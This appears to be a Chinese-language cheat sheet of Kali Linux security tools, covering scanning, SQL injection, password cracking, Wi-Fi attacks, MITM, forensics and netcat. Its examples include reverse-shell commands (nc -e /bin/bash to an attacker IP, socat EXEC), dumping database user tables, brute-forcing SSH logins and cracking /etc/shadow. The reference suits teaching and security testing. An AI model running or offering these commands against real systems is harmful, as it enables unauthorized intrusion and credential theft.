nmap 扫描
网络扫描之王 —— 发现主机、端口、服务、操作系统
📖 语法
nmap [选项] 目标
🔧 常用参数
# 扫描模式 -sS SYN 半开扫描（默认，快且隐蔽） -sT TCP 全连接扫描 -sV 探测服务版本 -O 识别操作系统 -A 激进扫描（OS + 版本 + 脚本 + 路由） -p- 扫描全部 65535 端口 -T4 加快扫描速度（0-5，4 较激进）
💡 示例
# 快速扫描常见端口 $ nmap -T4 192.168.1.1 # 全面扫描（服务 + 版本 + 系统 + 默认脚本） $ nmap -A -T4 scanme.nmap.org # 扫描全网段 22 端口（找 SSH） $ nmap -p 22 --open 192.168.1.0/24
💡nmap 在 Kali 里预装，但部分扫描需要 root 权限（如 SYN 扫描）。
nmap --script-help 查看所有 NSE 脚本，nmap --script vuln 跑漏洞扫描！

查询域名注册信息（所有者、注册商、过期时间）
📖 语法

💡 示例

💡信息收集第一步！查域名所有者和注册邮箱，常作为社工入口。

masscan 扫描
超高速端口扫描器 —— 号称"互联网扫描器"

⚠️masscan 速度极快，可以扫全互联网。确保你有合法授权！

nikto Web
Web 服务器漏洞扫描器 —— 检查危险文件、配置问题
📖 语法
nikto -h 目标 [选项]
💡 示例
# 基本扫描 $ nikto -h http://target.com # 指定端口 + SSL $ nikto -h target.com -p 443 -ssl # 保存结果 $ nikto -h target.com -o result.html -Format HTML
💡nikto 在 Kali 预装，但扫描较慢。常用于最初的 Web 踩点。
sqlmap SQLi
自动化 SQL 注入检测与利用工具
📖 语法
sqlmap -u URL [选项]
💡 示例
# 检测是否存在注入 $ sqlmap -u "http://target.com/page?id=1" # POST 请求 + Cookie $ sqlmap -u "http://target.com/login" --data "user=admin&pass=123" --cookie "PHPSESSID=..." # 获取数据库列表 $ sqlmap -u "http://target.com/page?id=1" --dbs # 获取表名 $ sqlmap -u "http://target.com/page?id=1" -D dbname --tables # 获取数据 $ sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
💡sqlmap 太强了 —— 一条命令能从注入到拿下数据库。--batch 自动回答所有询问。
openvas 综合
开源漏洞评估系统（Nessus 开源替代）
📖 语法
# Kali 2024+ 启动方式 $ sudo gvm-setup # 初始化（首次） $ sudo gvm-start # 启动 $ sudo gvm-check-setup # 检查状态
💡 使用
# 启动后浏览器访问 https://127.0.0.1:9392 # 默认用户: admin 默认密码: 初始生成
💡GVM（原 OpenVAS）是全平台漏洞扫描，含 10 万+ NVT 规则。首次安装需要下载很久。
searchsploit 查找
搜索 Exploit-DB 中的漏洞利用代码
📖 语法
searchsploit [关键词]
💡 示例
# 搜索 Apache 相关漏洞 $ searchsploit apache # 精确搜索（加版本号） $ searchsploit "Apache 2.4.49" # 复制 exploit 到当前目录 $ searchsploit -m 12345.py # 查看 exploit 详细信息 $ searchsploit -x 12345
💡Kali 离线缓存了 Exploit-DB 的全部内容！searchsploit -u 更新本地库。
nmap --script vuln 扫描
Nmap NSE 漏洞扫描脚本 —— 一键检测常见漏洞
📖 语法
nmap --script vuln 目标
💡 示例
# 跑全部漏洞脚本 $ nmap --script vuln -sV target.com # 只跑特定漏洞 $ nmap --script http-vuln* target.com
💡不用装额外工具 —— nmap 自带 NSE 脚本就能扫很多常见漏洞！
ls /usr/share/nmap/scripts/ 查看所有脚本。

gobuster 目录
目录/文件/DNS 暴力破解（Go 编写，速度快）
📖 语法
gobuster dir -u URL -w 字典
💡 示例
# 目录爆破 $ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt # 加扩展名（找 .php .asp 等） $ gobuster dir -u http://target.com -w dict.txt -x php,html,txt # DNS 子域名爆破 $ gobuster dns -d example.com -w subdomains.txt
💡Kali 字典位置：/usr/share/wordlists/。
dirb 是同类工具，但 gobuster 更快（Go 多线程）。

🔧 常用模块

💡Kali 预装了社区版。配合 FoxyProxy 浏览器插件使用最方便。
设置代理为 127.0.0.1:8080，装 CA 证书后就可以拦截 HTTPS。

ffuf 模糊

密码攻击

5 条
hydra 爆破
在线密码爆破之王 —— 支持 SSH/FTP/HTTP/MySQL 等 50+ 协议
📖 语法
hydra -l 用户 -P 字典 目标 协议
💡 示例
# SSH 爆破 $ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh # 用户列表 + 密码列表 $ hydra -L users.txt -P pass.txt ftp://192.168.1.100 # HTTP POST 表单爆破 $ hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect" # 指定线程数 $ hydra -l root -P pass.txt -t 4 192.168.1.100 ssh
💡Kali 自带字典 /usr/share/wordlists/rockyou.txt.gz，先解压：
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john 离线
John the Ripper —— 离线密码破解（哈希破解）
📖 语法
john [选项] 哈希文件
💡 示例
# 破解 shadow 文件 $ sudo unshadow /etc/passwd /etc/shadow > hashes.txt $ john hashes.txt # 指定字典 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt # 显示已破解的密码 $ john --show hashes.txt
💡取到 /etc/shadow 后第一件事：unshadow 然后 john！
GPU 加速版 hashcat 更快，但 john 更方便。
hashcat GPU
世界上最快的密码恢复工具（GPU 加速）
📖 语法
hashcat -m 模式 -a 攻击方式 哈希 字典
💡 示例
# 破解 MD5（-m 0）字典攻击（-a 0） $ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # 常用模式 -m 0 MD5 -m 1000 NTLM（Windows） -m 3200 bcrypt（慢） -m 1800 sha512crypt（Linux shadow）
💡hashcat 需要 GPU（Kali VM 默认没有），但 CPU 也能跑只是慢。
hashcat --example-hashes 查看所有模式的哈希样例。
crunch 字典
生成自定义密码字典
📖 语法
crunch 最小长度 最大长度 [字符集] [选项]
💡 示例
# 生成长度 6-8 的数字密码 $ crunch 6 8 0123456789 -o num.txt # 生成 admin 开头的密码 $ crunch 8 10 -t admin%%%
⚠️文件会非常大！6 位数字 100 万条 ≈ 8MB，8 位字母数字 ≈ 200TB+！
cewl 爬取
从网站爬取关键词生成自定义字典
📖 语法
cewl -w 输出 URL
💡 示例
# 爬取目标网站生成密码字典 $ cewl -w target_words.txt https://target.com # 指定爬取深度 $ cewl -d 3 -m 6 -w dict.txt https://target.com
💡社工必备！从目标公司网站爬取的词（人名、产品名）命中率极高。

无线网络

4 条
aircrack-ng Wi-Fi
Wi-Fi 安全审计工具套装（抓包、破解 WPA/WPA2）
📖 流程
# 1. 开启监听模式 $ sudo airmon-ng start wlan0 # 2. 扫描附近网络 $ sudo airodump-ng wlan0mon # 3. 锁定目标抓包 $ sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon # 4. 解认证攻击（抓握手包） $ sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon # 5. 破解 $ aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
⚠️Wi-Fi 审计需要支持监听模式的外置网卡（如 Alfa AWUS036ACH）。
虚拟机里通常无效，必须物理机 + 外置网卡。
reaver WPS
WPS PIN 码暴力破解（WPA/WPA2 弱 PIN）
📖 语法
sudo reaver -i 接口 -b BSSID -vv
💡 示例
$ sudo reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv
💡现代路由器大多已禁用 WPS 或加了锁频保护。
不成功是常态 —— 不是所有路由器都脆弱。

$ sudo kismet # 启动后浏览器访问 http://127.0.0.1:2501
💡kismet 可以被动收集所有附近的 Wi-Fi 信号、蓝牙设备，还能检测到隐藏 SSID！
wifite 一键
自动化 Wi-Fi 审计脚本（封装 aircrack-ng）

💡懒人神器！一条命令全程自动化，适合 Wi-Fi 安全自检。

wireshark 抓包
图形化网络协议分析器（抓包神器）
📖 使用
# 启动（需要有 root 或 wireshark 组权限） $ sudo wireshark # 常用过滤表达式 http 只看 HTTP 请求 ip.addr == 1.2.3.4 过滤 IP tcp.port == 80 过滤端口 http.request 只显示 HTTP 请求 frame contains "admin" 搜索包内容
💡Kali 里预装。tshark 是 Wireshark 的命令行版，适合脚本自动化。
tcpdump CLI
命令行网络抓包分析工具
📖 语法
sudo tcpdump [选项] [表达式]
💡 示例
# 监听所有流量 $ sudo tcpdump -i eth0 # 只看 HTTP 流量 $ sudo tcpdump -i eth0 port 80 # 保存到 pcap 文件 $ sudo tcpdump -i eth0 -w capture.pcap # 读取 pcap 文件 $ sudo tcpdump -r capture.pcap
💡tcpdump port 80 -X 以十六进制+ASCII 显示包内容，能看到明文 HTTP！
bettercap MITM
功能强大的中间人攻击框架（MITM、DNS 欺骗、嗅探）
📖 使用

💡bettercap 是 kali 里的新 MITM 神器，比 ettercap 更现代、功能更全！
支持 HTTP/HTTPS/DNS 劫持、凭据捕获、实时模块加载。

💡ettercap 是经典老牌工具，bettercap 是它的现代替代品。

binwalk 固件
固件分析 —— 提取嵌入的文件系统、分析二进制
📖 语法
binwalk [选项] 文件
💡 示例
# 扫描嵌入的文件 $ binwalk firmware.bin # 提取所有内容 $ binwalk -e firmware.bin # 递归提取（针对多层打包） $ binwalk -Me firmware.bin
💡IOT 安全分析必备！从固件里提取文件系统（squashfs / ubifs）做进一步分析。
strings 字符串
从二进制文件中提取可打印字符串
📖 语法
strings [选项] 文件
💡 示例
# 提取所有字符串 $ strings suspicious.exe # 搜索特定内容（如 URL、密码） $ strings malware.bin | grep -i "http" # 设置最小长度 $ strings -n 10 binary.elf
💡最简单的逆向手段！经常能从恶意软件里找到 C2 地址、配置信息、硬编码密码。
volatility 内存
内存取证分析框架（分析 RAM 镜像）
📖 语法
volatility -f 镜像.dmp --profile=系统版本 [插件]
💡 示例
# 查看进程列表 $ volatility -f mem.dmp --profile=Win10x64 pslist # 查看网络连接 $ volatility -f mem.dmp --profile=Win10x64 netscan # 查看命令行历史 $ volatility -f mem.dmp --profile=Win10x64 cmdline # 提取密码哈希 $ volatility -f mem.dmp --profile=Win10x64 hashdump
💡取到内存 dump 后，volatility 可以还原正在运行的进程、网络连接、密码等！
Kali 2024+ 用 volatility3（不用 --profile 了）。
sleuthkit (fls/icat) 磁盘
磁盘取证工具集 —— 分析文件系统、恢复删除文件
📖 常用工具
fls 列出已删除的文件 icat 按 inode 读取文件内容 mmls 查看分区表 fsstat 查看文件系统详细信息

# 列出分区 $ mmls disk.img # 列出删除的文件 $ fls -rd disk.img # 按 inode 恢复文件 $ icat disk.img 12345 > recovered_file.txt

netcat (nc) 网络
TCP/IP 瑞士军刀 —— 端口扫描、反弹 Shell、文件传输
📖 语法
nc [选项] 主机 端口
💡 示例
# 监听端口（充当简易服务器） $ nc -lvnp 4444 # 反弹 Shell（目标机上执行） $ nc -e /bin/bash 你的IP 4444 # Linux $ nc.exe -e cmd.exe 你的IP 4444 # Windows # 端口扫描 $ nc -zv 192.168.1.1 22-100 # 文件传输（接收方） $ nc -lvnp 4444 > received.zip # 文件传输（发送方） $ nc -w 3 接收IP 4444 < file.zip
💡nc 最经典用法：反弹 Shell 和文件传输。
Kali 也预装 ncat（nmap 项目增强版），支持 SSL 加密传输。
socat 隧道
netcat 的增强版 —— 双向数据传输、端口转发、加密
💡 示例
# 反弹 Shell（比 nc 更稳定） $ socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash,pty,stderr # 端口转发 $ socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80 # 加密连接（需 OpenSSL） $ socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80
proxychains 代理
强制任意程序使用代理（Tor / HTTP / SOCKS）
📖 语法
proxychains 命令 [参数]
💡 示例
# 通过 Tor 使用 nmap 扫描（匿名扫描） $ proxychains nmap -sT -Pn target.com # 通过代理使用 curl $ proxychains curl https://check.torproject.org # 配置（/etc/proxychains.conf） socks4 127.0.0.1 9050 # Tor 默认端口
💡先启动 sudo systemctl start tor，然后 proxychains 就自动走 Tor 了！
注意：部分程序（如浏览器 DNS 泄漏）需要额外配置。
